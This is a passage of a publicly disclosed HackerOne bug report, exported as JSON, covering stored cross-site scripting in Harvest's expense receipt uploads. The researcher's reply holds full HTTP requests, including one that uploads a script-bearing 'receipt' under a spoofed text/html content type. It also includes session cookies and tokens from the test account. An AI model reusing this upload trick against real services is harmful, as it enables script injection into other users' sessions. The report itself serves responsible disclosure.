{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-10-28T16:40:48.884Z", 
    "voters": [
        "yaworsk", 
        "bogdantcaciuc", 
        "malcolmx", 
        "madrobot", 
        "sasi2103", 
        "fantam1", 
        "japz", 
        "smit", 
        "spetr0x", 
        "b1ngz"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "250.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 165324, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "XSS on expenses attachments", 
    "is_member_of_team?": null, 
    "vote_count": 10, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-11-27T16:40:48.930Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$250", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-09-02T17:27:46.303Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-02T17:27:46.303Z", 
            "actor": {
                "username": "jorgeleria", 
                "url": "/jorgeleria", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/680/3e44968ac3b661792cd01009529cfad463cdf10c_medium.jpg?1459336835"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "harvest", 
            "message": "Hi Edgar,\n\nThanks a lot for this one! I'm trying to reproduce it without luck. I get `Receipt has contents that are not what they are reported to be` every time I modify the content and content-type.\n\nWhat are you using to intercept and modify the request on Chrome?\n\nCheers,\nJorge", 
            "markdown_message": "<p>Hi Edgar,</p>\n\n<p>Thanks a lot for this one! I&#39;m trying to reproduce it without luck. I get <code>Receipt has contents that are not what they are reported to be</code> every time I modify the content and content-type.</p>\n\n<p>What are you using to intercept and modify the request on Chrome?</p>\n\n<p>Cheers,<br>\nJorge</p>\n", 
            "type": "Activities::BugNeedsMoreInfo", 
            "id": 1170191, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/116/870/0a37eb5d215cae1eb184f3ef6015bd6e6da93d59/harvest_xss.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUSPGCL6N%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224634Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDFGKtgcswjtdzZD0XiK3A%2FxGmzpKHr5ekoQ8Q6J1p2wPg%2B4lFXgLgHF8GV%2FpAbzl8c1jkeJVbQGafh9cCZf5nDkGGvoj1MW8%2FEqxoLETmowovv5DF6JNI6KtcUa99kUpPVGGA41vwt0TYR4sK79EGjJ1GZQvua81wmE6Al9%2FjyEKMBr4Z%2BD%2B7%2BxkjtRr2YkyxWAbiFJAjY1c73ORg6Fm1lE7l99tqmBVg%2FxU2Bzq6cPN%2FiMjyU1Z8EEY0QfR7QN0mMEGqQAGivtnDAT%2Bm2soywu4tb%2FQz0UdoECNK3s%2F9RCntJ9rQjC2MdAgwPm%2FRGk7xh8O7tjef6RDTKiNGJsV2lyV78CVRog%2B376zzUEwsF%2FqAB%2F%2FhSXQ3Nu4PsGgilZIaKU0lHYU6BuG5uPwA4xIiWUtsltBgrtCN7JFz6qEg4WQudRCGwCzYxBJW3pl6P9ybgvmwORCVSRuYjX0UCWse2f7dpknAIOIdCfrNgcD1Og5lammFgkg8JCWe8S7Y29RMxkM0hwegOESBJjpUHD2rzBeABbol%2BCVNT5Ny6IYZq%2BQP%2B1M3ETgSt%2B5Z79oTiJmKpuZKzjDoQBjx98RK2QrPYCjuAJzSMcokIem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d54855c4af992a56b4a0a997f94b2e8f2afcbac4471f09d2aa71ce0d76931473", 
                    "type": "image/png", 
                    "id": 116870, 
                    "filename": "harvest_xss.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2016-09-02T18:50:57.231Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-02T18:53:21.769Z", 
            "actor": {
                "username": "eboda", 
                "url": "/eboda", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/014/247/d7776229fda51a883d9c330038262d2272fe2360_medium.png?1515881564"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "harvest", 
            "message": "Hey Jorge,\n\nsorry about that. I use burp to intercept the requests. Here are the original and modified request (just changed the last POST parameter):\n\n**original**\n```http\nPOST /api/v2/expenses?user_id=1374213 HTTP/1.1\nHost: asdfasdfgg.harvestapp.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-CSRF-Token: BbmcH/f+jBHHZuIziG4fxAfn+1lrILzJT2iZDWdJ+dDyiuMKEOar3J8/FZj2gtYM4xjaGAkN49XECYXTPv/yWw==\nX-Requested-With: XMLHttpRequest\nReferer: https://asdfasdfgg.harvestapp.com/expenses\nContent-Length: 1507\nContent-Type: multipart/form-data; boundary=---------------------------17838777311605021843483527673\nCookie: _harvest_sess=MHF4eVZWeEwvUUkzN1c5UTFJSU4xLzRvU2xaVWd5dVhXSW1YR2lpcUlvZnhTOCtmNENoSXN1d1VPL3REbTRsQWpycW03Rk1WUVRJTFl4eE5mTDFIM3BmTUZQYU1vbjJSV05zZUFrWmNpWDRCSExrZU13RkxnQ3lNcVdtRDZ4ZjA5OVQ2NjZzZU55cFZ1a3drcWFSVDZHenNlUk5wUzNudnlSNnFkcnpMSndzcFhhaHVvdzZJZmRlbCs2dkVxRnMwc1RKWTNXaGw1VHAxMm41cFgzaEp5UT09LS1MbVNtVXhYZzdzcTVjc0JQbFJZVXh3PT0%3D--6b9441bddb1011e85ab457ba94d448e32ff60d8b; platform_user_id=BAhpAwRzFA%3D%3D--30deb6c1217bad0fd56ca34fd64d86ef60cbec60; removed_from_remarketing=true; production_access_token=Uyt1NHk0emZDZ1p0ZHJyNGVTQjZCVnBmd0tmWGtEekxNOWM0UmVKcXJ5aTJEVWIyMWdZZGdVVHlNRnc3MlhGRFdyNlZUeCtSUWhDL2VxcnZpSHkwclVhN1c0NmtMNFcyTUdvc1lRSUFzdWpoY3czNjVlTHYvRHFramFHTVhBdzhEbk42WHVUT0M2bndhNDBUc1psSUx3PT0tLWZuRVRmWldYaEM2MXNuUzZlMXNFdmc9PQ%3D%3D--c1e5888f3ac0918014580f1c9f6a22acc15d0134\nConnection: close\n\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"billable\"\n\n1\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"user_id\"\n\n1374213\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"spent_at\"\n\n2016-09-02\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"authenticity_token\"\n\nBbmcH/f+jBHHZuIziG4fxAfn+1lrILzJT2iZDWdJ+dDyiuMKEOar3J8/FZj2gtYM4xjaGAkN49XECYXTPv/yWw==\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"delete_receipt\"\n\n\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"project_id\"\n\n11576566\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"expense_category_id\"\n\n3529908\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"notes\"\n\n\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"units\"\n\n\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"total_cost\"\n\n11.00\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"receipt\"; filename=\"test.jpeg\"\nContent-Type: image/jpeg\n\nJPEG\n\n-----------------------------17838777311605021843483527673--\n```\n\n**modified**\n```http\nPOST /api/v2/expenses?user_id=1374213 HTTP/1.1\nHost: asdfasdfgg.harvestapp.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-CSRF-Token: BbmcH/f+jBHHZuIziG4fxAfn+1lrILzJT2iZDWdJ+dDyiuMKEOar3J8/FZj2gtYM4xjaGAkN49XECYXTPv/yWw==\nX-Requested-With: XMLHttpRequest\nReferer: https://asdfasdfgg.harvestapp.com/expenses\nContent-Length: 1547\nContent-Type: multipart/form-data; boundary=---------------------------17838777311605021843483527673\nCookie: _harvest_sess=MHF4eVZWeEwvUUkzN1c5UTFJSU4xLzRvU2xaVWd5dVhXSW1YR2lpcUlvZnhTOCtmNENoSXN1d1VPL3REbTRsQWpycW03Rk1WUVRJTFl4eE5mTDFIM3BmTUZQYU1vbjJSV05zZUFrWmNpWDRCSExrZU13RkxnQ3lNcVdtRDZ4ZjA5OVQ2NjZzZU55cFZ1a3drcWFSVDZHenNlUk5wUzNudnlSNnFkcnpMSndzcFhhaHVvdzZJZmRlbCs2dkVxRnMwc1RKWTNXaGw1VHAxMm41cFgzaEp5UT09LS1MbVNtVXhYZzdzcTVjc0JQbFJZVXh3PT0%3D--6b9441bddb1011e85ab457ba94d448e32ff60d8b; platform_user_id=BAhpAwRzFA%3D%3D--30deb6c1217bad0fd56ca34fd64d86ef60cbec60; removed_from_remarketing=true; production_access_token=Uyt1NHk0emZDZ1p0ZHJyNGVTQjZCVnBmd0tmWGtEekxNOWM0UmVKcXJ5aTJEVWIyMWdZZGdVVHlNRnc3MlhGRFdyNlZUeCtSUWhDL2VxcnZpSHkwclVhN1c0NmtMNFcyTUdvc1lRSUFzdWpoY3czNjVlTHYvRHFramFHTVhBdzhEbk42WHVUT0M2bndhNDBUc1psSUx3PT0tLWZuRVRmWldYaEM2MXNuUzZlMXNFdmc9PQ%3D%3D--c1e5888f3ac0918014580f1c9f6a22acc15d0134\nConnection: close\n\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"billable\"\n\n1\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"user_id\"\n\n1374213\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"spent_at\"\n\n2016-08-02\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"authenticity_token\"\n\nBbmcH/f+jBHHZuIziG4fxAfn+1lrILzJT2iZDWdJ+dDyiuMKEOar3J8/FZj2gtYM4xjaGAkN49XECYXTPv/yWw==\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"delete_receipt\"\n\n\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"project_id\"\n\n11576566\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"expense_category_id\"\n\n3529908\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"notes\"\n\n\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"units\"\n\n\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"total_cost\"\n\n11.00\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=\"receipt\"; filename=\"test\"\nContent-Type: text/html image/jpeg\n\n<script>alert(document.domain);</script>\n-----------------------------17838777311605021843483527673--\n```\n\nThen the response is:\n```json\n{\"id\":12126357,\"user_id\":1374213,\"project_id\":11576566,\"expense_category_id\":3529908,\"invoice_id\":0,\"notes\":\"\",\"total_cost\":11.0,\"units\":1.0,\"has_receipt\":true,\"receipt_url\":\"https://asdfasdfgg.harvestapp.com/expenses/12126357/receipt\",\"receipt_file_name\":\"test\",\"is_closed\":false,\"is_locked\":false,\"locked_reason\":null,\"spent_at\":\"2016-08-02\",\"created_at\":\"2016-09-02T18:45:10Z\",\"updated_at\":\"2016-09-02T18:45:10Z\",\"billable\":true,\"project_full_name\":\"[AAAAAAAAAAA] asdf\",\"client_currency\":\"GBP\",\"client_id\":4778185,\"client_name\":\"asdf\",\"expense_category_name\":\"Lodging\",\"unit_price\":null,\"unit_name\":null}\n```\n\nAnd when I open the receipt_url I get the response:\n\n```http\nHTTP/1.1 200 OK\nServer: nginx\nDate: Fri, 02 Sep 2016 18:49:48 GMT\nContent-Type: text/html image/jpeg\nContent-Length: 40\nConnection: close\nCache-Control: max-age=0\nContent-Disposition: inline; filename=\"test.\"\n\n<script>alert(document.domain);</script>\n```\nAnd you can see the XSS in the picture I have attached to this comment.\n\nHope this helps!", 
            "markdown_message": "<p>Hey Jorge,</p>\n\n<p>sorry about that. I use burp to intercept the requests. Here are the original and modified request (just changed the last POST parameter):</p>\n\n<p><strong>original</strong></p>\n<pre class=\"highlight http\"><code><span class=\"nf\">POST</span> <span class=\"nn\">/api/v2/expenses?user_id=1374213</span> <span class=\"k\">HTTP</span><span class=\"o\">/</span><span class=\"m\">1.1</span>\n<span class=\"na\">Host</span><span class=\"p\">:</span> <span class=\"s\">asdfasdfgg.harvestapp.com</span>\n<span class=\"na\">User-Agent</span><span class=\"p\">:</span> <span class=\"s\">Mozilla/5.0 (X11; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0</span>\n<span class=\"na\">Accept</span><span class=\"p\">:</span> <span class=\"s\">application/json, text/javascript, */*; q=0.01</span>\n<span class=\"na\">Accept-Language</span><span class=\"p\">:</span> <span class=\"s\">en-US,en;q=0.5</span>\n<span class=\"na\">Accept-Encoding</span><span class=\"p\">:</span> <span class=\"s\">gzip, deflate</span>\n<span class=\"na\">X-CSRF-Token</span><span class=\"p\">:</span> <span class=\"s\">BbmcH/f+jBHHZuIziG4fxAfn+1lrILzJT2iZDWdJ+dDyiuMKEOar3J8/FZj2gtYM4xjaGAkN49XECYXTPv/yWw==</span>\n<span class=\"na\">X-Requested-With</span><span class=\"p\">:</span> <span class=\"s\">XMLHttpRequest</span>\n<span class=\"na\">Referer</span><span class=\"p\">:</span> <span class=\"s\">https://asdfasdfgg.harvestapp.com/expenses</span>\n<span class=\"na\">Content-Length</span><span class=\"p\">:</span> <span class=\"s\">1507</span>\n<span class=\"na\">Content-Type</span><span class=\"p\">:</span> <span class=\"s\">multipart/form-data; boundary=---------------------------17838777311605021843483527673</span>\n<span class=\"na\">Cookie</span><span class=\"p\">:</span> <span class=\"s\">_harvest_sess=MHF4eVZWeEwvUUkzN1c5UTFJSU4xLzRvU2xaVWd5dVhXSW1YR2lpcUlvZnhTOCtmNENoSXN1d1VPL3REbTRsQWpycW03Rk1WUVRJTFl4eE5mTDFIM3BmTUZQYU1vbjJSV05zZUFrWmNpWDRCSExrZU13RkxnQ3lNcVdtRDZ4ZjA5OVQ2NjZzZU55cFZ1a3drcWFSVDZHenNlUk5wUzNudnlSNnFkcnpMSndzcFhhaHVvdzZJZmRlbCs2dkVxRnMwc1RKWTNXaGw1VHAxMm41cFgzaEp5UT09LS1MbVNtVXhYZzdzcTVjc0JQbFJZVXh3PT0%3D--6b9441bddb1011e85ab457ba94d448e32ff60d8b; platform_user_id=BAhpAwRzFA%3D%3D--30deb6c1217bad0fd56ca34fd64d86ef60cbec60; removed_from_remarketing=true; production_access_token=Uyt1NHk0emZDZ1p0ZHJyNGVTQjZCVnBmd0tmWGtEekxNOWM0UmVKcXJ5aTJEVWIyMWdZZGdVVHlNRnc3MlhGRFdyNlZUeCtSUWhDL2VxcnZpSHkwclVhN1c0NmtMNFcyTUdvc1lRSUFzdWpoY3czNjVlTHYvRHFramFHTVhBdzhEbk42WHVUT0M2bndhNDBUc1psSUx3PT0tLWZuRVRmWldYaEM2MXNuUzZlMXNFdmc9PQ%3D%3D--c1e5888f3ac0918014580f1c9f6a22acc15d0134</span>\n<span class=\"na\">Connection</span><span class=\"p\">:</span> <span class=\"s\">close</span>\n\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;billable&quot;\n\n1\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;user_id&quot;\n\n1374213\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;spent_at&quot;\n\n2016-09-02\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;authenticity_token&quot;\n\nBbmcH/f+jBHHZuIziG4fxAfn+1lrILzJT2iZDWdJ+dDyiuMKEOar3J8/FZj2gtYM4xjaGAkN49XECYXTPv/yWw==\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;delete_receipt&quot;\n\n\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;project_id&quot;\n\n11576566\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;expense_category_id&quot;\n\n3529908\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;notes&quot;\n\n\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;units&quot;\n\n\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;total_cost&quot;\n\n11.00\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;receipt&quot;; filename=&quot;test.jpeg&quot;\nContent-Type: image/jpeg\n\nJPEG\n\n-----------------------------17838777311605021843483527673--\n</code></pre>\n<p><strong>modified</strong></p>\n<pre class=\"highlight http\"><code><span class=\"nf\">POST</span> <span class=\"nn\">/api/v2/expenses?user_id=1374213</span> <span class=\"k\">HTTP</span><span class=\"o\">/</span><span class=\"m\">1.1</span>\n<span class=\"na\">Host</span><span class=\"p\">:</span> <span class=\"s\">asdfasdfgg.harvestapp.com</span>\n<span class=\"na\">User-Agent</span><span class=\"p\">:</span> <span class=\"s\">Mozilla/5.0 (X11; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0</span>\n<span class=\"na\">Accept</span><span class=\"p\">:</span> <span class=\"s\">application/json, text/javascript, */*; q=0.01</span>\n<span class=\"na\">Accept-Language</span><span class=\"p\">:</span> <span class=\"s\">en-US,en;q=0.5</span>\n<span class=\"na\">Accept-Encoding</span><span class=\"p\">:</span> <span class=\"s\">gzip, deflate</span>\n<span class=\"na\">X-CSRF-Token</span><span class=\"p\">:</span> <span class=\"s\">BbmcH/f+jBHHZuIziG4fxAfn+1lrILzJT2iZDWdJ+dDyiuMKEOar3J8/FZj2gtYM4xjaGAkN49XECYXTPv/yWw==</span>\n<span class=\"na\">X-Requested-With</span><span class=\"p\">:</span> <span class=\"s\">XMLHttpRequest</span>\n<span class=\"na\">Referer</span><span class=\"p\">:</span> <span class=\"s\">https://asdfasdfgg.harvestapp.com/expenses</span>\n<span class=\"na\">Content-Length</span><span class=\"p\">:</span> <span class=\"s\">1547</span>\n<span class=\"na\">Content-Type</span><span class=\"p\">:</span> <span class=\"s\">multipart/form-data; boundary=---------------------------17838777311605021843483527673</span>\n<span class=\"na\">Cookie</span><span class=\"p\">:</span> <span class=\"s\">_harvest_sess=MHF4eVZWeEwvUUkzN1c5UTFJSU4xLzRvU2xaVWd5dVhXSW1YR2lpcUlvZnhTOCtmNENoSXN1d1VPL3REbTRsQWpycW03Rk1WUVRJTFl4eE5mTDFIM3BmTUZQYU1vbjJSV05zZUFrWmNpWDRCSExrZU13RkxnQ3lNcVdtRDZ4ZjA5OVQ2NjZzZU55cFZ1a3drcWFSVDZHenNlUk5wUzNudnlSNnFkcnpMSndzcFhhaHVvdzZJZmRlbCs2dkVxRnMwc1RKWTNXaGw1VHAxMm41cFgzaEp5UT09LS1MbVNtVXhYZzdzcTVjc0JQbFJZVXh3PT0%3D--6b9441bddb1011e85ab457ba94d448e32ff60d8b; platform_user_id=BAhpAwRzFA%3D%3D--30deb6c1217bad0fd56ca34fd64d86ef60cbec60; removed_from_remarketing=true; production_access_token=Uyt1NHk0emZDZ1p0ZHJyNGVTQjZCVnBmd0tmWGtEekxNOWM0UmVKcXJ5aTJEVWIyMWdZZGdVVHlNRnc3MlhGRFdyNlZUeCtSUWhDL2VxcnZpSHkwclVhN1c0NmtMNFcyTUdvc1lRSUFzdWpoY3czNjVlTHYvRHFramFHTVhBdzhEbk42WHVUT0M2bndhNDBUc1psSUx3PT0tLWZuRVRmWldYaEM2MXNuUzZlMXNFdmc9PQ%3D%3D--c1e5888f3ac0918014580f1c9f6a22acc15d0134</span>\n<span class=\"na\">Connection</span><span class=\"p\">:</span> <span class=\"s\">close</span>\n\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;billable&quot;\n\n1\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;user_id&quot;\n\n1374213\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;spent_at&quot;\n\n2016-08-02\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;authenticity_token&quot;\n\nBbmcH/f+jBHHZuIziG4fxAfn+1lrILzJT2iZDWdJ+dDyiuMKEOar3J8/FZj2gtYM4xjaGAkN49XECYXTPv/yWw==\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;delete_receipt&quot;\n\n\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;project_id&quot;\n\n11576566\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;expense_category_id&quot;\n\n3529908\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;notes&quot;\n\n\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;units&quot;\n\n\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;total_cost&quot;\n\n11.00\n-----------------------------17838777311605021843483527673\nContent-Disposition: form-data; name=&quot;receipt&quot;; filename=&quot;test&quot;\nContent-Type: text/html image/jpeg\n\n&lt;script&gt;alert(document.domain);&lt;/script&gt;\n-----------------------------17838777311605021843483527673--\n</code></pre>\n<p>Then the response is:</p>\n<pre class=\"highlight json\"><code><span class=\"p\">{</span><span class=\"s2\">&quot;id&quot;</span><span class=\"p\">:</span><span class=\"mi\">12126357</span><span class=\"p\">,</span><span class=\"s2\">&quot;user_id&quot;</span><span class=\"p\">:</span><span class=\"mi\">1374213</span><span class=\"p\">,</span><span class=\"s2\">&quot;project_id&quot;</span><span class=\"p\">:</span><span class=\"mi\">11576566</span><span class=\"p\">,</span><span class=\"s2\">&quot;expense_category_id&quot;</span><span class=\"p\">:</span><span class=\"mi\">3529908</span><span class=\"p\">,</span><span class=\"s2\">&quot;invoice_id&quot;</span><span class=\"p\">:</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"s2\">&quot;notes&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;&quot;</span><span class=\"p\">,</span><span class=\"s2\">&quot;total_cost&quot;</span><span class=\"p\">:</span><span class=\"mf\">11.0</span><span class=\"p\">,</span><span class=\"s2\">&quot;units&quot;</span><span class=\"p\">:</span><span class=\"mf\">1.0</span><span class=\"p\">,</span><span class=\"s2\">&quot;has_receipt&quot;</span><span class=\"p\">:</span><span class=\"kc\">true</span><span class=\"p\">,</span><span class=\"s2\">&quot;receipt_url&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;https://asdfasdfgg.harvestapp.com/expenses/12126357/receipt&quot;</span><span class=\"p\">,</span><span class=\"s2\">&quot;receipt_file_name&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;test&quot;</span><span class=\"p\">,</span><span class=\"s2\">&quot;is_closed&quot;</span><span class=\"p\">:</span><span class=\"kc\">false</span><span class=\"p\">,</span><span class=\"s2\">&quot;is_locked&quot;</span><span class=\"p\">:</span><span class=\"kc\">false</span><span class=\"p\">,</span><span class=\"s2\">&quot;locked_reason&quot;</span><span class=\"p\">:</span><span class=\"kc\">null</span><span class=\"p\">,</span><span class=\"s2\">&quot;spent_at&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;2016-08-02&quot;</span><span class=\"p\">,</span><span class=\"s2\">&quot;created_at&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;2016-09-02T18:45:10Z&quot;</span><span class=\"p\">,</span><span class=\"s2\">&quot;updated_at&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;2016-09-02T18:45:10Z&quot;</span><span class=\"p\">,</span><span class=\"s2\">&quot;billable&quot;</span><span class=\"p\">:</span><span class=\"kc\">true</span><span class=\"p\">,</span><span class=\"s2\">&quot;project_full_name&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;[AAAAAAAAAAA] asdf&quot;</span><span class=\"p\">,</span><span class=\"s2\">&quot;client_currency&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;GBP&quot;</span><span class=\"p\">,</span><span class=\"s2\">&quot;client_id&quot;</span><span class=\"p\">:</span><span class=\"mi\">4778185</span><span class=\"p\">,</span><span class=\"s2\">&quot;client_name&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;asdf&quot;</span><span class=\"p\">,</span><span class=\"s2\">&quot;expense_category_name&quot;</span><span class=\"p\">:</span><span class=\"s2\">&quot;Lodging&quot;</span><span class=\"p\">,</span><span class=\"s2\">&quot;unit_price&quot;</span><span class=\"p\">:</span><span class=\"kc\">null</span><span class=\"p\">,</span><span class=\"s2\">&quot;unit_name&quot;</span><span class=\"p\">:</span><span class=\"kc\">null</span><span class=\"p\">}</span><span class=\"w\">\n</span></code></pre>\n<p>And when I open the receipt_url I get the response:</p>\n<pre class=\"highlight http\"><code><span class=\"k\">HTTP</span><span class=\"o\">/</span><span class=\"m\">1.1</span> <span class=\"m\">200</span> <span class=\"ne\">OK</span>\n<span class=\"na\">Server</span><span class=\"p\">:</span> <span class=\"s\">nginx</span>\n<span class=\"na\">Date</span><span class=\"p\">:</span> <span class=\"s\">Fri, 02 Sep 2016 18:49:48 GMT</span>\n<span class=\"na\">Content-Type</span><span class=\"p\">:</span> <span class=\"s\">text/html image/jpeg</span>\n<span class=\"na\">Content-Length</span><span class=\"p\">:</span> <span class=\"s\">40</span>\n<span class=\"na\">Connection</span><span class=\"p\">:</span> <span class=\"s\">close</span>\n<span class=\"na\">Cache-Control</span><span class=\"p\">:</span> <span class=\"s\">max-age=0</span>\n<span class=\"na\">Content-Disposition</span><span class=\"p\">:</span> <span class=\"s\">inline; filename=&quot;test.&quot;</span>\n\n&lt;script&gt;alert(document.domain);&lt;/script&gt;\n</code></pre>\n<p>And you can see the XSS in the picture I have attached to this comment.</p>\n\n<p>Hope this helps!</p>\n", 
            "type": "Activities::BugNew", 
            "id": 1170363, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-02T19:10:19.821Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-02T19:10:19.821Z", 
            "actor": {
                "username": "jorgeleria", 
                "url": "/jorgeleria", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/680/3e44968ac3b661792cd01009529cfad463cdf10c_medium.jpg?1459336835"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "harvest", 
            "message": "Thanks a lot for the clarification, I've been able to reproduce it!\nI'm changing the state to triage and we will contact you as soon as it is fixed.\n\nCheers,\nJorge", 
            "markdown_message": "<p>Thanks a lot for the clarification, I&#39;ve been able to reproduce it!<br>\nI&#39;m changing the state to triage and we will contact you as soon as it is fixed.</p>\n\n<p>Cheers,<br>\nJorge</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 1170410, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-10-25T10:03:05.121Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-25T10:03:05.121Z", 
            "actor": {
                "username": "eboda", 
                "url": "/eboda", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/014/247/d7776229fda51a883d9c330038262d2272fe2360_medium.png?1515881564"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "harvest", 
            "message": "Hey Jorge,\n\nI have checked back on this issue and it seems to be fixed now :)", 
            "markdown_message": "<p>Hey Jorge,</p>\n\n<p>I have checked back on this issue and it seems to be fixed now :)</p>\n", 
            "type": "Activities::Comment", 
            "id": 1266367, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "eboda", 
                "url": "/eboda"
            }, 
